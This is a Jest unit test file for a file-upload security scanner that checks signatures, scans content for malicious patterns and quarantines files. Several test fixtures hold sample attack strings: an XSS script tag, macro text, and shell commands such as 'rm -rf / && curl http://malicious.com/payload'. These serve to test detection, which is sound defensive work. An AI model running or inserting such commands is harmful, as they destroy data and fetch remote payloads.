/**
 * Unit tests for FileSecurityService
 * 
 * Tests cover:
 * - File signature validation (magic numbers)
 * - Content scanning for malicious patterns
 * - File quarantine functionality
 * - Security threat detection
 * - Performance optimizations
 */

import { FileSecurityService } from '../../services/fileSecurityService';
import { promises as fsAsync } from 'fs';
import path from 'path';
import crypto from 'crypto';

// Mock dependencies
jest.mock('fs', () => ({
  promises: {
    readFile: jest.fn(),
    writeFile: jest.fn(),
    mkdir: jest.fn(),
    copyFile: jest.fn(),
    stat: jest.fn(),
  },
}));

jest.mock('crypto', () => ({
  createHash: jest.fn(),
}));

describe('FileSecurityService', () => {
  let fileSecurityService: FileSecurityService;
  let mockFsAsync: jest.Mocked<typeof fsAsync>;
  let mockCrypto: jest.Mocked<typeof crypto>;

  beforeEach(() => {
    jest.clearAllMocks();
    mockFsAsync = fsAsync as jest.Mocked<typeof fsAsync>;
    mockCrypto = crypto as jest.Mocked<typeof crypto>;
    
    fileSecurityService = new FileSecurityService();

    // Mock crypto hash
    const mockHash = {
      update: jest.fn().mockReturnThis(),
      digest: jest.fn().mockReturnValue('mock-hash-value'),
    };
    mockCrypto.createHash.mockReturnValue(mockHash as any);
  });

  describe('scanFile', () => {
    const testFilePath = '/test/resume.pdf';
    const validPdfSignature = Buffer.from([0x25, 0x50, 0x44, 0x46]); // %PDF
    const validDocxSignature = Buffer.from([0x50, 0x4B, 0x03, 0x04]); // PK (ZIP)
    const maliciousExecutable = Buffer.from([0x4D, 0x5A]); // MZ (Windows executable)

    beforeEach(() => {
      // Mock file stats
      mockFsAsync.stat.mockResolvedValue({
        size: 1024 * 1024, // 1MB
        isFile: () => true,
      } as any);
    });

    it('should pass security scan for valid PDF file', async () => {
      // Arrange
      const cleanPdfContent = Buffer.concat([
        validPdfSignature,
        Buffer.from('This is a clean PDF document with normal content.')
      ]);
      mockFsAsync.readFile.mockResolvedValue(cleanPdfContent);

      // Act
      const result = await fileSecurityService.scanFile(testFilePath, 'application/pdf');

      // Assert
      expect(result.isSecure).toBe(true);
      expect(result.threats).toHaveLength(0);
      expect(result.fileInfo.mimeType).toBe('application/pdf');
      expect(result.fileInfo.hash).toBe('mock-hash-value');
      expect(result.fileInfo.size).toBe(1024 * 1024);
    });

    it('should detect file signature mismatch', async () => {
      // Arrange - PDF MIME type but executable signature
      mockFsAsync.readFile.mockResolvedValue(maliciousExecutable);

      // Act
      const result = await fileSecurityService.scanFile(testFilePath, 'application/pdf');

      // Assert
      expect(result.isSecure).toBe(false);
      expect(result.threats).toContain('File signature does not match MIME type');
    });

    it('should detect JavaScript injection attempts', async () => {
      // Arrange
      const maliciousContent = Buffer.concat([
        validPdfSignature,
        Buffer.from('<script>alert("XSS attack")</script>')
      ]);
      mockFsAsync.readFile.mockResolvedValue(maliciousContent);

      // Act
      const result = await fileSecurityService.scanFile(testFilePath, 'application/pdf');

      // Assert
      expect(result.isSecure).toBe(false);
      expect(result.threats).toContain('JavaScript code detected');
    });

    it('should detect executable content', async () => {
      // Arrange
      const maliciousContent = Buffer.concat([
        validPdfSignature,
        Buffer.from('This file contains .exe and other executable content')
      ]);
      mockFsAsync.readFile.mockResolvedValue(maliciousContent);

      // Act
      const result = await fileSecurityService.scanFile(testFilePath, 'application/pdf');

      // Assert
      expect(result.isSecure).toBe(false);
      expect(result.threats).toContain('Executable file patterns detected');
    });

    it('should detect macro content in Office documents', async () => {
      // Arrange
      const macroContent = Buffer.concat([
        validDocxSignature,
        Buffer.from('vbscript macro content here')
      ]);
      mockFsAsync.readFile.mockResolvedValue(macroContent);

      // Act
      const result = await fileSecurityService.scanFile(testFilePath, 'application/vnd.openxmlformats-officedocument.wordprocessingml.document');

      // Assert
      expect(result.isSecure).toBe(false);
      expect(result.threats).toContain('Macro or script content detected');
    });

    it('should detect shell command injection', async () => {
      // Arrange
      const shellContent = Buffer.concat([
        validPdfSignature,
        Buffer.from('rm -rf / && curl http://malicious.com/payload')
      ]);
      mockFsAsync.readFile.mockResolvedValue(shellContent);

      // Act
      const result = await fileSecurityService.scanFile(testFilePath, 'application/pdf');

      // Assert
      expect(result.isSecure).toBe(false);
      expect(result.threats).toContain('Shell command patterns detected');
    });

    it('should handle file read errors gracefully', async () => {
      // Arrange
      mockFsAsync.readFile.mockRejectedValue(new Error('File read error'));

      // Act & Assert
      await expect(fileSecurityService.scanFile(testFilePath, 'application/pdf'))
        .rejects.toThrow('File read error');
    });

    it('should reject files that are too small', async () => {
      // Arrange
      mockFsAsync.stat.mockResolvedValue({
        size: 50, // Too small (less than 100 bytes)
        isFile: () => true,
      } as any);

      // Act
      const result = await fileSecurityService.scanFile(testFilePath, 'application/pdf');

      // Assert
      expect(result.isSecure).toBe(false);
      expect(result.threats).toContain('File size too small (minimum 100 bytes)');
    });

    it('should reject files that are too large', async () => {
      // Arrange
      mockFsAsync.stat.mockResolvedValue({
        size: 15 * 1024 * 1024, // 15MB (larger than 10MB limit)
        isFile: () => true,
      } as any);

      // Act
      const result = await fileSecurityService.scanFile(testFilePath, 'application/pdf');

      // Assert
      expect(result.isSecure).toBe(false);
      expect(result.threats).toContain('File size exceeds maximum limit (10MB)');
    });

    it('should limit content scanning for performance', async () => {
      // Arrange - Large file content
      const largeContent = Buffer.concat([
        validPdfSignature,
        Buffer.alloc(1024 * 1024, 'a') // 1MB of 'a' characters
      ]);
      mockFsAsync.readFile.mockResolvedValue(largeContent);

      // Act
      const result = await fileSecurityService.scanFile(testFilePath, 'application/pdf');

      // Assert
      expect(result.isSecure).toBe(true);
      // Should only scan first 512KB for performance
      expect(mockFsAsync.readFile).toHaveBeenCalledWith(testFilePath, { start: 0, end: 524287 });
    });

    it('should detect multiple threats and stop early', async () => {
      // Arrange - Content with multiple threats
      const multiThreatContent = Buffer.concat([
        validPdfSignature,
        Buffer.from('<script>alert("XSS")</script>'),
        Buffer.from('rm -rf /'),
        Buffer.from('vbscript macro'),
        Buffer.from('.exe file')
      ]);
      mockFsAsync.readFile.mockResolvedValue(multiThreatContent);

      // Act
      const result = await fileSecurityService.scanFile(testFilePath, 'application/pdf');

      // Assert
      expect(result.isSecure).toBe(false);
      expect(result.threats.length).toBeGreaterThan(1);
      // Should detect multiple threats but may stop early for performance
    });
  });

  describe('quarantineFile', () => {
    const testFilePath = '/test/malicious.pdf';

    beforeEach(() => {
      mockFsAsync.mkdir.mockResolvedValue(undefined);
      mockFsAsync.copyFile.mockResolvedValue(undefined);
    });

    it('should quarantine file to secure location', () => {
      // Act
      const quarantinePath = fileSecurityService.quarantineFile(testFilePath);

      // Assert
      expect(quarantinePath).toContain('quarantine');
      expect(quarantinePath).toContain('malicious.pdf');
      expect(mockFsAsync.mkdir).toHaveBeenCalled();
      expect(mockFsAsync.copyFile).toHaveBeenCalledWith(testFilePath, quarantinePath);
    });

    it('should generate unique quarantine filename with timestamp', () => {
      // Act
      const quarantinePath1 = fileSecurityService.quarantineFile(testFilePath);
      const quarantinePath2 = fileSecurityService.quarantineFile(testFilePath);

      // Assert
      expect(quarantinePath1).not.toBe(quarantinePath2);
      expect(quarantinePath1).toMatch(/\d{13}/); // Timestamp pattern
      expect(quarantinePath2).toMatch(/\d{13}/); // Timestamp pattern
    });

    it('should handle quarantine directory creation errors', () => {
      // Arrange
      mockFsAsync.mkdir.mockRejectedValue(new Error('Permission denied'));

      // Act & Assert
      expect(() => fileSecurityService.quarantineFile(testFilePath))
        .not.toThrow(); // Should handle error gracefully
    });
  });

  describe('file signature validation', () => {
    it('should validate PDF signatures correctly', async () => {
      // Test various PDF signatures
      const pdfSignatures = [
        Buffer.from([0x25, 0x50, 0x44, 0x46]), // %PDF
        Buffer.from([0x25, 0x50, 0x44, 0x46, 0x2D, 0x31, 0x2E, 0x34]), // %PDF-1.4
      ];

      for (const signature of pdfSignatures) {
        mockFsAsync.readFile.mockResolvedValue(signature);
        mockFsAsync.stat.mockResolvedValue({ size: 1024, isFile: () => true } as any);

        const result = await fileSecurityService.scanFile('/test.pdf', 'application/pdf');
        expect(result.isSecure).toBe(true);
      }
    });

    it('should validate DOCX signatures correctly', async () => {
      // DOCX files are ZIP archives with PK signature
      const docxSignature = Buffer.from([0x50, 0x4B, 0x03, 0x04]);
      mockFsAsync.readFile.mockResolvedValue(docxSignature);
      mockFsAsync.stat.mockResolvedValue({ size: 1024, isFile: () => true } as any);

      const result = await fileSecurityService.scanFile('/test.docx', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document');
      expect(result.isSecure).toBe(true);
    });

    it('should validate TXT files (no specific signature required)', async () => {
      // TXT files don't have magic numbers, so any content is valid
      const textContent = Buffer.from('This is plain text content');
      mockFsAsync.readFile.mockResolvedValue(textContent);
      mockFsAsync.stat.mockResolvedValue({ size: 1024, isFile: () => true } as any);

      const result = await fileSecurityService.scanFile('/test.txt', 'text/plain');
      expect(result.isSecure).toBe(true);
    });
  });

  describe('performance optimizations', () => {
    it('should limit scan size for large files', async () => {
      // Arrange
      const largeFile = Buffer.alloc(2 * 1024 * 1024, 'a'); // 2MB file
      mockFsAsync.readFile.mockResolvedValue(largeFile);
      mockFsAsync.stat.mockResolvedValue({ size: 2 * 1024 * 1024, isFile: () => true } as any);

      // Act
      await fileSecurityService.scanFile('/large.pdf', 'application/pdf');

      // Assert
      // Should only read first 512KB for performance
      expect(mockFsAsync.readFile).toHaveBeenCalledWith('/large.pdf', { start: 0, end: 524287 });
    });

    it('should stop scanning after detecting multiple threats', async () => {
      // This is tested indirectly through the threat detection tests
      // The service should implement early exit when multiple threats are found
      expect(true).toBe(true); // Placeholder for performance test
    });
  });
});
